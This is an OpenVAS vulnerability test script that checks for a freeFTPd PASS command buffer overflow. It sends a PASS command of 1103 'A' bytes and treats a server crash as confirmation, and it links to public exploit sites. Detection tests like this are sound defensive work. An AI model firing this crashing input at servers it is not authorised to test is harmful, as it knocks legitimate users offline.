###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_freeftpd_pass_cmd_bof_vuln.nasl 13347 2019-01-29 15:54:59Z cfischer $
#
# freeFTPD PASS Command Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803747");
  script_version("$Revision: 13347 $");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2019-01-29 16:54:59 +0100 (Tue, 29 Jan 2019) $");
  script_tag(name:"creation_date", value:"2013-08-22 16:55:03 +0530 (Thu, 22 Aug 2013)");
  script_name("freeFTPD PASS Command Buffer Overflow Vulnerability");

  script_tag(name:"summary", value:"The host is running FreeFTPD Server and is prone to buffer overflow
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send the crafted FTP request and check server is dead or not.");

  script_tag(name:"solution", value:"Upgrade to freeFTPd version 1.0.12 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"insight", value:"The flaw is due to an improper handling of huge data in the 'PASS'
  command.");

  script_tag(name:"affected", value:"freeFTPd version 1.0.10 and prior.");

  script_tag(name:"impact", value:"Successful exploitation allows remote attackers to crash an affected server,
  effectively denying service to legitimate users.");

  script_xref(name:"URL", value:"http://1337day.com/exploits/21139");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/27747/");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/freeftpd-1010-buffer-overflow");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp_banner/available");

  script_xref(name:"URL", value:"http://www.freesshd.com/?ctt=download");

  exit(0);
}

include("ftp_func.inc");

ftpPort = get_ftp_port(default:21);
banner = get_ftp_banner(port:ftpPort);
if(!banner || "I'm freeFTPd" >!< banner){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

banner = ftp_recv_line(socket:soc);
if(!banner || "I'm freeFTPd" >!< banner) {
  ftp_close(socket:soc);
  exit(0);
}

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];

ftp_send_cmd(socket:soc, cmd:"USER " + user);
ftp_send_cmd(socket:soc, cmd:"PASS " + crap(length:1103, data:"A"));

close(soc);

soc2 = open_sock_tcp(ftpPort);
if(!soc2){
  security_message(port:ftpPort);
  exit(0);
}

banner = recv(socket:soc2, length:512);
ftp_close(socket:soc2);
if(!banner || "I'm freeFTPd" >!< banner){
  security_message(port:ftpPort);
  exit(0);
}